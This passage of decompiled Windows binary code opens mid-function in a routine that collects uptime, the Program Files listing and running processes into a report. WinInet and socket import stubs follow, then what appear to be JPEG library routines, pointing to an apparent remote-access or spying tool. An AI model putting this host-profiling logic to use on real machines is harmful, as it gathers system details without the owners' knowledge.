  local_30c = 1;
  FUN_004086e0(&local_2c,(int)local_8c,
               (int)puVar4 + ((-3 - (uint)CARRY1((byte)uVar2,(byte)uVar2)) - (int)local_8c));
  GetTickCount();
  sprintf((char *)local_8c,"Uptime: %i min\n");
  puVar4 = local_8c;
  do {
    puVar6 = puVar4;
    puVar4 = puVar6 + 1;
    uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
    uVar2 = uVar7 & 0x80808080;
  } while (uVar2 == 0);
  if ((uVar7 & 0x8080) == 0) {
    uVar2 = uVar2 >> 0x10;
    puVar4 = (uint *)((int)puVar6 + 6);
  }
  local_30c = 1;
  FUN_004086e0(&local_2c,(int)local_8c,
               (int)puVar4 + ((-3 - (uint)CARRY1((byte)uVar2,(byte)uVar2)) - (int)local_8c));
  FUN_004086e0(&local_2c,0x425167,2);
  FUN_004086e0(&local_2c,0x42516c,0x23);
  pcVar3 = getenv("PROGRAMFILES");
  strlen(pcVar3);
  FUN_00421910();
  local_318 = acStack_330;
  getenv("PROGRAMFILES");
  sprintf(local_318,"%s\\*.*");
  local_31c = _findfirst();
  bVar8 = local_31c == 0;
  if (!bVar8) {
    do {
      iVar5 = 2;
      puVar4 = local_198;
      pcVar3 = ".";
      do {
        if (iVar5 == 0) break;
        iVar5 = iVar5 + -1;
        bVar8 = *(char *)puVar4 == *pcVar3;
        puVar4 = (uint *)((int)puVar4 + 1);
        pcVar3 = pcVar3 + 1;
      } while (bVar8);
      if (!bVar8) {
        iVar5 = 3;
        puVar4 = local_198;
        pcVar3 = "..";
        do {
          if (iVar5 == 0) break;
          iVar5 = iVar5 + -1;
          bVar8 = *(char *)puVar4 == *pcVar3;
          puVar4 = (uint *)((int)puVar4 + 1);
          pcVar3 = pcVar3 + 1;
        } while (bVar8);
        if (!bVar8) {
          puVar4 = local_198;
          do {
            puVar6 = puVar4;
            puVar4 = puVar6 + 1;
            uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
            uVar2 = uVar7 & 0x80808080;
          } while (uVar2 == 0);
          if ((uVar7 & 0x8080) == 0) {
            uVar2 = uVar2 >> 0x10;
            puVar4 = (uint *)((int)puVar6 + 6);
          }
          local_30c = 1;
          FUN_004086e0(&local_2c,(int)local_198,
                       (int)puVar4 + ((-3 - (uint)CARRY1((byte)uVar2,(byte)uVar2)) - (int)local_198)
                      );
          FUN_004086e0(&local_2c,0x4251a9,1);
        }
      }
      local_30c = 1;
      iVar5 = _findnext();
      bVar8 = iVar5 == 0;
    } while (bVar8);
    local_30c = 1;
    _findclose(local_31c);
  }
  local_30c = 1;
  FUN_004086e0(&local_2c,0x425167,2);
  FUN_004086e0(&local_2c,0x4251ac,0x24);
  local_320 = (HANDLE)CreateToolhelp32Snapshot();
  if (local_320 != (HANDLE)0x0) {
    local_2dc[0] = 0x128;
    iVar5 = Process32First(local_320,local_2dc);
    while( true ) {
      if (iVar5 == 0) break;
      puVar4 = local_2b8;
      do {
        puVar6 = puVar4;
        puVar4 = puVar6 + 1;
        uVar7 = *puVar6 + 0xfefefeff & ~*puVar6;
        uVar2 = uVar7 & 0x80808080;
      } while (uVar2 == 0);
      if ((uVar7 & 0x8080) == 0) {
        uVar2 = uVar2 >> 0x10;
        puVar4 = (uint *)((int)puVar6 + 6);
      }
      local_30c = 1;
      FUN_004086e0(&local_2c,(int)local_2b8,
                   (int)puVar4 + ((-3 - (uint)CARRY1((byte)uVar2,(byte)uVar2)) - (int)local_2b8));
      FUN_004086e0(&local_2c,0x4251a9,1);
      iVar5 = Process32Next(local_320,local_2dc);
    }
    local_30c = 1;
    CloseHandle(local_320);
  }
  local_30c = 1;
  FUN_004086e0(&local_2c,0x425167,2);
  local_324 = (char *)FUN_0041f7e0(local_28 + 1);
  strcpy(local_324,local_2c);
  local_30c = 0xffffffff;
  FUN_004086c0(&local_2c);
  piVar1 = local_314;
  *local_314 = (int)&local_310;
  piVar1[-1] = 0x40a8f2;
  FUN_00421b30((LPVOID *)*piVar1);
  return local_324;
}



void InternetGetConnectedState(void)

{
                    // WARNING: Could not recover jumptable at 0x0040a900. Too many branches
                    // WARNING: Treating indirect jump as call
  InternetGetConnectedState();
  return;
}



void InternetOpenA(void)

{
                    // WARNING: Could not recover jumptable at 0x0040a908. Too many branches
                    // WARNING: Treating indirect jump as call
  InternetOpenA();
  return;
}



void InternetConnectA(void)

{
                    // WARNING: Could not recover jumptable at 0x0040a910. Too many branches
                    // WARNING: Treating indirect jump as call
  InternetConnectA();
  return;
}



void HttpOpenRequestA(void)

{
                    // WARNING: Could not recover jumptable at 0x0040a918. Too many branches
                    // WARNING: Treating indirect jump as call
  HttpOpenRequestA();
  return;
}



void HttpSendRequestA(void)

{
                    // WARNING: Could not recover jumptable at 0x0040a920. Too many branches
                    // WARNING: Treating indirect jump as call
  HttpSendRequestA();
  return;
}



void InternetReadFile(void)

{
                    // WARNING: Could not recover jumptable at 0x0040a928. Too many branches
                    // WARNING: Treating indirect jump as call
  InternetReadFile();
  return;
}



void InternetCloseHandle(void)

{
                    // WARNING: Could not recover jumptable at 0x0040a930. Too many branches
                    // WARNING: Treating indirect jump as call
  InternetCloseHandle();
  return;
}



MCIERROR mciSendStringA(LPCSTR lpstrCommand,LPSTR lpstrReturnString,UINT uReturnLength,
                       HWND hwndCallback)

{
  MCIERROR MVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a938. Too many branches
                    // WARNING: Treating indirect jump as call
  MVar1 = mciSendStringA(lpstrCommand,lpstrReturnString,uReturnLength,hwndCallback);
  return MVar1;
}



MCIERROR mciSendCommandA(MCIDEVICEID mciId,UINT uMsg,DWORD_PTR dwParam1,DWORD_PTR dwParam2)

{
  MCIERROR MVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a940. Too many branches
                    // WARNING: Treating indirect jump as call
  MVar1 = mciSendCommandA(mciId,uMsg,dwParam1,dwParam2);
  return MVar1;
}



int WSAStartup(WORD wVersionRequired,LPWSADATA lpWSAData)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a948. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = WSAStartup(wVersionRequired,lpWSAData);
  return iVar1;
}



SOCKET socket(int af,int type,int protocol)

{
  SOCKET SVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a950. Too many branches
                    // WARNING: Treating indirect jump as call
  SVar1 = socket(af,type,protocol);
  return SVar1;
}



hostent * gethostbyname(char *name)

{
  hostent *phVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a958. Too many branches
                    // WARNING: Treating indirect jump as call
  phVar1 = gethostbyname(name);
  return phVar1;
}



u_short htons(u_short hostshort)

{
  u_short uVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a960. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = htons(hostshort);
  return uVar1;
}



int connect(SOCKET s,sockaddr *name,int namelen)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a968. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = connect(s,name,namelen);
  return iVar1;
}



int closesocket(SOCKET s)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a970. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = closesocket(s);
  return iVar1;
}



int send(SOCKET s,char *buf,int len,int flags)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a980. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = send(s,buf,len,flags);
  return iVar1;
}



void __cdecl FUN_0040a9b8(int *param_1,int param_2,int param_3)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int *piVar4;
  
  param_1[1] = 0;
  if (param_2 != 0x50) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0xd;
    *(undefined4 *)(iVar1 + 0x18) = 0x50;
    *(int *)(*param_1 + 0x1c) = param_2;
    (**(code **)*param_1)(param_1);
  }
  if (param_3 != 0x1a0) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x16;
    *(undefined4 *)(iVar1 + 0x18) = 0x1a0;
    *(int *)(*param_1 + 0x1c) = param_3;
    (**(code **)*param_1)(param_1);
  }
  iVar1 = *param_1;
  iVar2 = param_1[3];
  piVar4 = param_1;
  for (iVar3 = 0x1a0; iVar3 != 0; iVar3 = iVar3 + -1) {
    *(undefined *)piVar4 = 0;
    piVar4 = (int *)((int)piVar4 + 1);
  }
  *param_1 = iVar1;
  param_1[3] = iVar2;
  FUN_0040d01c(param_1);
  param_1[2] = 0;
  param_1[6] = 0;
  param_1[0x15] = 0;
  param_1[0x16] = 0;
  param_1[0x1a] = 100;
  param_1[0x17] = 0;
  param_1[0x1b] = 100;
  param_1[0x18] = 0;
  param_1[0x1c] = 100;
  param_1[0x19] = 0;
  param_1[0x1d] = 100;
  param_1[0x1e] = 0;
  param_1[0x22] = 0;
  param_1[0x1f] = 0;
  param_1[0x23] = 0;
  param_1[0x20] = 0;
  param_1[0x24] = 0;
  param_1[0x21] = 0;
  param_1[0x25] = 0;
  param_1[0x5a] = 8;
  param_1[0x5b] = (int)&DAT_00426f00;
  param_1[0x5c] = 0x3f;
  param_1[0x66] = 0;
  param_1[0xc] = 0;
  param_1[0xd] = 0x3ff00000;
  param_1[5] = 100;
  return;
}



void __cdecl thunk_FUN_0040d1c0(int param_1)

{
  if (*(int *)(param_1 + 4) != 0) {
    (**(code **)(*(int *)(param_1 + 4) + 0x28))(param_1);
  }
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 0x14) = 0;
  return;
}



void __cdecl FUN_0040ab20(int param_1,undefined param_2)

{
  int iVar1;
  int iVar2;
  
  iVar2 = 0;
  do {
    iVar1 = *(int *)(param_1 + 0x58 + iVar2 * 4);
    if (iVar1 != 0) {
      *(undefined *)(iVar1 + 0x80) = param_2;
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 != 4);
  iVar2 = 0;
  do {
    iVar1 = *(int *)(param_1 + 0x78 + iVar2 * 4);
    if (iVar1 != 0) {
      *(undefined *)(iVar1 + 0x111) = param_2;
    }
    iVar1 = *(int *)(param_1 + 0x88 + iVar2 * 4);
    if (iVar1 != 0) {
      *(undefined *)(iVar1 + 0x111) = param_2;
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 != 4);
  return;
}



void FUN_0040ab68(int *param_1)

{
  int iVar1;
  int iVar2;
  code **ppcVar3;
  char cVar4;
  code *pcVar5;
  code *pcVar6;
  
  iVar1 = param_1[5];
  if (iVar1 - 0x65U < 2) {
    if ((uint)param_1[8] <= (uint)param_1[0x3d]) goto LAB_0040ac06;
    ppcVar3 = (code **)*param_1;
    ppcVar3[5] = (code *)0x45;
    (**ppcVar3)(param_1);
    goto LAB_0040ac06;
  }
  if (iVar1 != 0x67) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x15;
    *(int *)(iVar2 + 0x18) = iVar1;
    (**(code **)*param_1)(param_1);
  }
  ppcVar3 = (code **)param_1[0x5d];
  cVar4 = *(char *)((int)ppcVar3 + 0xd);
  do {
    if (cVar4 != '\0') {
      (**(code **)(param_1[0x61] + 0xc))(param_1);
      (**(code **)(param_1[6] + 0x10))(param_1);
      FUN_0040d178((int)param_1);
      return;
    }
    (**ppcVar3)(param_1);
    pcVar5 = (code *)param_1[0x43];
    if (pcVar5 != (code *)0x0) {
      pcVar6 = (code *)0x0;
      do {
        while( true ) {
          ppcVar3 = (code **)param_1[2];
          if (ppcVar3 != (code **)0x0) {
            ppcVar3[1] = pcVar6;
            ppcVar3[2] = pcVar5;
            (**ppcVar3)(param_1);
          }
          cVar4 = (**(code **)(param_1[0x60] + 4))(param_1,0);
          if (cVar4 != '\0') break;
          ppcVar3 = (code **)*param_1;
          ppcVar3[5] = (code *)0x19;
          (**ppcVar3)(param_1);
          pcVar6 = pcVar6 + 1;
          pcVar5 = (code *)param_1[0x43];
          if (pcVar5 <= pcVar6) goto LAB_0040ac06;
        }
        pcVar6 = pcVar6 + 1;
        pcVar5 = (code *)param_1[0x43];
      } while (pcVar6 < pcVar5);
    }
LAB_0040ac06:
    (**(code **)(param_1[0x5d] + 8))(param_1);
    ppcVar3 = (code **)param_1[0x5d];
    cVar4 = *(char *)((int)ppcVar3 + 0xd);
  } while( true );
}



void __cdecl FUN_0040ad9c(int *param_1,char param_2)

{
  int iVar1;
  int iVar2;
  
  iVar1 = param_1[5];
  if (iVar1 != 100) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x15;
    *(int *)(iVar2 + 0x18) = iVar1;
    (**(code **)*param_1)(param_1);
  }
  if (param_2 != '\0') {
    FUN_0040ab20((int)param_1,0);
  }
  (**(code **)(*param_1 + 0x10))(param_1);
  (**(code **)(param_1[6] + 8))(param_1);
  FUN_0040dc74(param_1);
  (**(code **)param_1[0x5d])(param_1);
  param_1[0x3d] = 0;
  param_1[5] = 0x66 - (uint)(*(char *)(param_1 + 0x34) == '\0');
  return;
}



void __cdecl FUN_0040ae28(int *param_1,undefined4 param_2,uint param_3)

{
  int iVar1;
  int iVar2;
  code **ppcVar3;
  int local_10 [3];
  
  iVar1 = param_1[5];
  if (iVar1 != 0x65) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x15;
    *(int *)(iVar2 + 0x18) = iVar1;
    (**(code **)*param_1)(param_1);
  }
  if ((uint)param_1[8] <= (uint)param_1[0x3d]) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x7e;
    (**(code **)(iVar1 + 4))(param_1,0xffffffff);
  }
  ppcVar3 = (code **)param_1[2];
  if (ppcVar3 != (code **)0x0) {
    ppcVar3[1] = (code *)param_1[0x3d];
    ppcVar3[2] = (code *)param_1[8];
    (**ppcVar3)(param_1);
  }
  if (*(char *)(param_1[0x5d] + 0xc) != '\0') {
    (**(code **)(param_1[0x5d] + 4))(param_1);
  }
  if ((uint)(param_1[8] - param_1[0x3d]) < param_3) {
    param_3 = param_1[8] - param_1[0x3d];
  }
  local_10[0] = 0;
  (**(code **)(param_1[0x5e] + 4))(param_1,param_2,local_10,param_3);
  param_1[0x3d] = param_1[0x3d] + local_10[0];
  return;
}



void __fastcall FUN_0040afb8(undefined *param_1,int *param_2,undefined *param_3)

{
  code **ppcVar1;
  int *in_EAX;
  int iVar2;
  undefined *puVar3;
  int iVar4;
  undefined *puVar5;
  
  puVar3 = (undefined *)*param_2;
  if (puVar3 == (undefined *)0x0) {
    puVar3 = (undefined *)FUN_0040d214((int)in_EAX);
    *param_2 = (int)puVar3;
  }
  puVar5 = param_1;
  for (iVar4 = 0x11; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar3 = *puVar5;
    puVar5 = puVar5 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar2 = 1;
  iVar4 = 0;
  do {
    iVar4 = iVar4 + (uint)(byte)param_1[iVar2];
    iVar2 = iVar2 + 1;
  } while (iVar2 != 0x11);
  if (0xff < iVar4 - 1U) {
    ppcVar1 = (code **)*in_EAX;
    ppcVar1[5] = (code *)0x9;
    (**ppcVar1)();
  }
  puVar3 = (undefined *)(*param_2 + 0x11);
  for (; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar3 = *param_3;
    param_3 = param_3 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)(*param_2 + 0x111) = 0;
  return;
}



void __cdecl FUN_0040b0b0(int *param_1,uint param_2,int param_3,int param_4,char param_5)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  iVar2 = param_1[5];
  if (iVar2 != 100) {
    iVar3 = *param_1;
    *(undefined4 *)(iVar3 + 0x14) = 0x15;
    *(int *)(iVar3 + 0x18) = iVar2;
    (**(code **)*param_1)(param_1);
  }
  if (3 < param_2) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x20;
    *(uint *)(iVar2 + 0x18) = param_2;
    (**(code **)*param_1)(param_1);
  }
  iVar2 = param_1[param_2 + 0x16];
  if (iVar2 == 0) {
    iVar2 = FUN_0040d1e8((int)param_1);
    param_1[param_2 + 0x16] = iVar2;
  }
  iVar3 = 0;
  do {
    iVar1 = (param_4 * *(int *)(param_3 + iVar3 * 4) + 0x32) / 100;
    if (iVar1 < 1) {
      iVar1 = 1;
    }
    else if (0x7fff < iVar1) {
      iVar1 = 0x7fff;
    }
    if ((param_5 != '\0') && (0xff < iVar1)) {
      iVar1 = 0xff;
    }
    *(short *)(iVar2 + iVar3 * 2) = (short)iVar1;
    iVar3 = iVar3 + 1;
  } while (iVar3 != 0x40);
  *(undefined *)(iVar2 + 0x80) = 0;
  return;
}



void __cdecl FUN_0040b1f8(int *param_1,int param_2,char param_3)

{
  FUN_0040b0b0(param_1,0,0x425220,param_2,param_3);
  FUN_0040b0b0(param_1,1,0x425320,param_2,param_3);
  return;
}



void __cdecl FUN_0040b288(int *param_1,int param_2,char param_3)

{
  int iVar1;
  
  if (param_2 < 1) {
    iVar1 = 5000;
  }
  else if (param_2 < 0x65) {
    if (param_2 < 0x32) {
      iVar1 = (int)(5000 / (longlong)param_2);
    }
    else {
      iVar1 = (100 - param_2) * 2;
    }
  }
  else {
    iVar1 = 0;
  }
  FUN_0040b1f8(param_1,iVar1,param_3);
  return;
}



void __cdecl FUN_0040b2dc(int *param_1,int param_2)

{
  code **ppcVar1;
  undefined4 *puVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  
  iVar4 = param_1[5];
  if (iVar4 != 100) {
    iVar5 = *param_1;
    *(undefined4 *)(iVar5 + 0x14) = 0x15;
    *(int *)(iVar5 + 0x18) = iVar4;
    (**(code **)*param_1)(param_1);
  }
  param_1[0x14] = param_2;
  *(undefined *)(param_1 + 0x3a) = 0;
  *(undefined *)(param_1 + 0x3c) = 0;
  switch(param_2) {
  case 0:
    break;
  case 1:
    *(undefined *)(param_1 + 0x3a) = 1;
    param_1[0x13] = 1;
    puVar2 = (undefined4 *)param_1[0x15];
    *puVar2 = 1;
    puVar2[2] = 1;
    puVar2[3] = 1;
    puVar2[4] = 0;
    puVar2[5] = 0;
    puVar2[6] = 0;
    return;
  case 2:
    *(undefined *)(param_1 + 0x3c) = 1;
    param_1[0x13] = 3;
    puVar2 = (undefined4 *)param_1[0x15];
    *puVar2 = 0x52;
    puVar2[2] = 1;
    puVar2[3] = 1;
    puVar2[4] = 0;
    puVar2[5] = 0;
    puVar2[6] = 0;
    puVar2[0x16] = 0x47;
    puVar2[0x18] = 1;
    puVar2[0x19] = 1;
    puVar2[0x1a] = 0;
    puVar2[0x1b] = 0;
    puVar2[0x1c] = 0;
    puVar2[0x2c] = 0x42;
    puVar2[0x2e] = 1;
    puVar2[0x2f] = 1;
    puVar2[0x30] = 0;
    puVar2[0x31] = 0;
    puVar2[0x32] = 0;
    return;
  case 3:
    *(undefined *)(param_1 + 0x3a) = 1;
    param_1[0x13] = 3;
    puVar2 = (undefined4 *)param_1[0x15];
    *puVar2 = 1;
    puVar2[2] = 2;
    puVar2[3] = 2;
    puVar2[4] = 0;
    puVar2[5] = 0;
    puVar2[6] = 0;
    puVar2[0x16] = 2;
    puVar2[0x18] = 1;
    puVar2[0x19] = 1;
    puVar2[0x1a] = 1;
    puVar2[0x1b] = 1;
    puVar2[0x1c] = 1;
    puVar2[0x2c] = 3;
    puVar2[0x2e] = 1;
    puVar2[0x2f] = 1;
    puVar2[0x30] = 1;
    puVar2[0x31] = 1;
    puVar2[0x32] = 1;
    return;
  case 4:
    *(undefined *)(param_1 + 0x3c) = 1;
    param_1[0x13] = 4;
    puVar2 = (undefined4 *)param_1[0x15];
    *puVar2 = 0x43;
    puVar2[2] = 1;
    puVar2[3] = 1;
    puVar2[4] = 0;
    puVar2[5] = 0;
    puVar2[6] = 0;
    puVar2[0x16] = 0x4d;
    puVar2[0x18] = 1;
    puVar2[0x19] = 1;
    puVar2[0x1a] = 0;
    puVar2[0x1b] = 0;
    puVar2[0x1c] = 0;
    puVar2[0x2c] = 0x59;
    puVar2[0x2e] = 1;
    puVar2[0x2f] = 1;
    puVar2[0x30] = 0;
    puVar2[0x31] = 0;
    puVar2[0x32] = 0;
    puVar2[0x42] = 0x4b;
    puVar2[0x44] = 1;
    puVar2[0x45] = 1;
    puVar2[0x46] = 0;
    puVar2[0x47] = 0;
    puVar2[0x48] = 0;
    return;
  case 5:
    *(undefined *)(param_1 + 0x3c) = 1;
    param_1[0x13] = 4;
    puVar2 = (undefined4 *)param_1[0x15];
    *puVar2 = 1;
    puVar2[2] = 2;
    puVar2[3] = 2;
    puVar2[4] = 0;
    puVar2[5] = 0;
    puVar2[6] = 0;
    puVar2[0x16] = 2;
    puVar2[0x18] = 1;
    puVar2[0x19] = 1;
    puVar2[0x1a] = 1;
    puVar2[0x1b] = 1;
    puVar2[0x1c] = 1;
    puVar2[0x2c] = 3;
    puVar2[0x2e] = 1;
    puVar2[0x2f] = 1;
    puVar2[0x30] = 1;
    puVar2[0x31] = 1;
    puVar2[0x32] = 1;
    puVar2[0x42] = 4;
    puVar2[0x44] = 2;
    puVar2[0x45] = 2;
    puVar2[0x46] = 0;
    puVar2[0x47] = 0;
    puVar2[0x48] = 0;
    return;
  default:
    ppcVar1 = (code **)*param_1;
    ppcVar1[5] = (code *)0xb;
                    // WARNING: Could not recover jumptable at 0x0040b32e. Too many branches
                    // WARNING: Treating indirect jump as call
    (**ppcVar1)();
    return;
  }
  iVar4 = param_1[9];
  param_1[0x13] = iVar4;
  if (9 < iVar4 - 1U) {
    iVar5 = *param_1;
    *(undefined4 *)(iVar5 + 0x14) = 0x1b;
    *(int *)(iVar5 + 0x18) = iVar4;
    *(undefined4 *)(*param_1 + 0x1c) = 10;
    (**(code **)*param_1)(param_1);
    iVar4 = param_1[0x13];
    if (iVar4 < 1) {
      return;
    }
  }
  piVar3 = (int *)param_1[0x15];
  iVar5 = 0;
  do {
    *piVar3 = iVar5;
    piVar3[2] = 1;
    piVar3[3] = 1;
    piVar3[4] = 0;
    piVar3[5] = 0;
    piVar3[6] = 0;
    iVar5 = iVar5 + 1;
    piVar3 = piVar3 + 0x16;
  } while (iVar5 != iVar4);
  return;
}



void __cdecl FUN_0040b708(int *param_1)

{
  code **ppcVar1;
  
  if (5 < (uint)param_1[10]) {
    ppcVar1 = (code **)*param_1;
    ppcVar1[5] = (code *)0xa;
                    // WARNING: Could not recover jumptable at 0x0040b727. Too many branches
                    // WARNING: Treating indirect jump as call
    (**ppcVar1)();
    return;
  }
  switch(param_1[10]) {
  case 0:
    FUN_0040b2dc(param_1,0);
    return;
  case 1:
    FUN_0040b2dc(param_1,1);
    return;
  default:
    FUN_0040b2dc(param_1,3);
    return;
  case 4:
    FUN_0040b2dc(param_1,4);
    return;
  case 5:
    FUN_0040b2dc(param_1,5);
    return;
  }
}



void __cdecl FUN_0040b79c(int *param_1)

{
  int iVar1;
  int iVar2;
  
  iVar2 = param_1[5];
  if (iVar2 != 100) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x15;
    *(int *)(iVar1 + 0x18) = iVar2;
    (**(code **)*param_1)(param_1);
  }
  if (param_1[0x15] == 0) {
    iVar2 = (**(code **)param_1[1])(param_1,0,0x370);
    param_1[0x15] = iVar2;
  }
  param_1[0xe] = 1;
  param_1[0xf] = 1;
  param_1[0x12] = 8;
  FUN_0040b288(param_1,0x4b,'\x01');
  FUN_0040afb8(&DAT_00425420,param_1 + 0x1e,&DAT_00425431);
  FUN_0040afb8(&DAT_0042543d,param_1 + 0x22,&DAT_00425460);
  FUN_0040afb8(&DAT_00425502,param_1 + 0x1f,&DAT_00425513);
  FUN_0040afb8(&DAT_0042551f,param_1 + 0x23,&DAT_00425540);
  iVar2 = 0;
  do {
    *(undefined *)((int)param_1 + iVar2 + 0x98) = 0;
    *(undefined *)((int)param_1 + iVar2 + 0xa8) = 1;
    *(undefined *)((int)param_1 + iVar2 + 0xb8) = 5;
    iVar2 = iVar2 + 1;
  } while (iVar2 != 0x10);
  param_1[0x33] = 0;
  param_1[0x32] = 0;
  *(undefined *)(param_1 + 0x34) = 0;
  *(undefined *)((int)param_1 + 0xd1) = 0;
  *(undefined *)((int)param_1 + 0xd2) = 0;
  if (8 < param_1[0x12]) {
    *(undefined *)((int)param_1 + 0xd2) = 1;
  }
  *(undefined *)((int)param_1 + 0xd3) = 0;
  *(undefined *)(param_1 + 0x35) = 1;
  param_1[0x36] = 0;
  param_1[0x37] = 0;
  param_1[0x38] = 0;
  param_1[0x39] = 0;
  *(undefined *)((int)param_1 + 0xe9) = 1;
  *(undefined *)((int)param_1 + 0xea) = 1;
  *(undefined *)((int)param_1 + 0xeb) = 0;
  *(undefined2 *)(param_1 + 0x3b) = 1;
  *(undefined2 *)((int)param_1 + 0xee) = 1;
  FUN_0040b708(param_1);
  return;
}



void __cdecl FUN_0040be68(int param_1,undefined4 param_2)

{
  int iVar1;
  
  iVar1 = *(int *)(param_1 + 0x18);
  if (iVar1 == 0) {
    iVar1 = (***(code ***)(param_1 + 4))(param_1,0,0x1c);
    *(int *)(param_1 + 0x18) = iVar1;
  }
  *(undefined **)(iVar1 + 8) = &LAB_0040bcb0;
  *(undefined **)(iVar1 + 0xc) = &LAB_0040bd90;
  *(undefined **)(iVar1 + 0x10) = &LAB_0040bde8;
  *(undefined4 *)(iVar1 + 0x14) = param_2;
  return;
}



void __cdecl FUN_0040c144(undefined4 *param_1)

{
  *param_1 = &LAB_0040c120;
  param_1[1] = &LAB_0040bf94;
  param_1[2] = &LAB_0040c0dc;
  param_1[3] = &LAB_0040bff8;
  param_1[4] = &LAB_0040bfe0;
  param_1[0x1a] = 0;
  param_1[0x1b] = 0;
  param_1[5] = 0;
  param_1[0x1c] = &PTR_s_Bogus_message_code__d_004268e0;
  param_1[0x1d] = 0x7e;
  param_1[0x1e] = 0;
  param_1[0x1f] = 0;
  param_1[0x20] = 0;
  return;
}



int __cdecl FUN_0040c1a8(int param_1,int param_2)

{
  return (param_1 + param_2 + -1) / param_2;
}



int __cdecl FUN_0040c1b8(int param_1,int param_2)

{
  int iVar1;
  
  iVar1 = param_2 + -1 + param_1;
  return iVar1 - iVar1 % param_2;
}



void __cdecl FUN_0040c1d0(int param_1,int param_2,int param_3,int param_4,int param_5,int param_6)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined *puVar4;
  undefined *puVar5;
  
  if (0 < param_5) {
    puVar2 = (undefined4 *)(param_1 + param_2 * 4);
    puVar3 = (undefined4 *)(param_3 + param_4 * 4);
    do {
      puVar4 = (undefined *)*puVar2;
      puVar2 = puVar2 + 1;
      puVar5 = (undefined *)*puVar3;
      puVar3 = puVar3 + 1;
      for (iVar1 = param_6; iVar1 != 0; iVar1 = iVar1 + -1) {
        *puVar5 = *puVar4;
        puVar4 = puVar4 + 1;
        puVar5 = puVar5 + 1;
      }
      param_5 = param_5 + -1;
    } while (param_5 != 0);
  }
  return;
}



void __fastcall FUN_0040c228(char param_1,int *param_2)

{
  int iVar1;
  undefined4 in_EAX;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  
  iVar1 = param_2[2];
  iVar6 = param_2[6];
  iVar5 = param_2[4];
  if (iVar5 < 1) {
    return;
  }
  iVar3 = param_2[5];
  if (iVar5 < iVar3) {
    iVar2 = param_2[7] - iVar6;
    if (iVar2 < iVar5) goto LAB_0040c31c;
LAB_0040c266:
    iVar3 = param_2[1] - iVar6;
    iVar2 = iVar5;
    if (iVar5 <= iVar3) goto LAB_0040c273;
  }
  else {
    iVar2 = param_2[7] - iVar6;
    iVar5 = iVar3;
    if (iVar3 <= iVar2) goto LAB_0040c266;
LAB_0040c31c:
    iVar3 = param_2[1] - iVar6;
    if (iVar2 <= iVar3) goto LAB_0040c273;
  }
  iVar2 = iVar3;
LAB_0040c273:
  if (0 < iVar2) {
    iVar6 = iVar6 * iVar1;
    iVar5 = 0;
    do {
      iVar2 = iVar2 * iVar1;
      if (param_1 == '\0') {
        (*(code *)param_2[10])();
        iVar3 = param_2[5];
        iVar5 = iVar5 + iVar3;
        iVar4 = param_2[4];
        if (iVar4 <= iVar5) {
          return;
        }
      }
      else {
        (*(code *)param_2[0xb])
                  (in_EAX,param_2 + 10,*(undefined4 *)(*param_2 + iVar5 * 4),iVar6,iVar2);
        iVar3 = param_2[5];
        iVar5 = iVar5 + iVar3;
        iVar4 = param_2[4];
        if (iVar4 <= iVar5) {
          return;
        }
      }
      iVar6 = iVar6 + iVar2;
      iVar2 = iVar4 - iVar5;
      if (iVar3 < iVar4 - iVar5) {
        iVar2 = iVar3;
      }
      iVar3 = param_2[7] - (param_2[6] + iVar5);
      if (iVar3 < iVar2) {
        iVar2 = iVar3;
      }
      iVar3 = param_2[1] - (param_2[6] + iVar5);
      if (iVar3 < iVar2) {
        iVar2 = iVar3;
      }
    } while (0 < iVar2);
  }
  return;
}



void __fastcall FUN_0040c344(char param_1,int *param_2)

{
  int iVar1;
  undefined4 in_EAX;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  
  iVar1 = param_2[2];
  iVar6 = param_2[6];
  iVar5 = param_2[4];
  if (iVar5 < 1) {
    return;
  }
  iVar3 = param_2[5];
  if (iVar5 < iVar3) {
    iVar2 = param_2[7] - iVar6;
    if (iVar2 < iVar5) goto LAB_0040c438;
LAB_0040c385:
    iVar3 = param_2[1] - iVar6;
    iVar2 = iVar5;
    if (iVar5 <= iVar3) goto LAB_0040c392;
  }
  else {
    iVar2 = param_2[7] - iVar6;
    iVar5 = iVar3;
    if (iVar3 <= iVar2) goto LAB_0040c385;
LAB_0040c438:
    iVar3 = param_2[1] - iVar6;
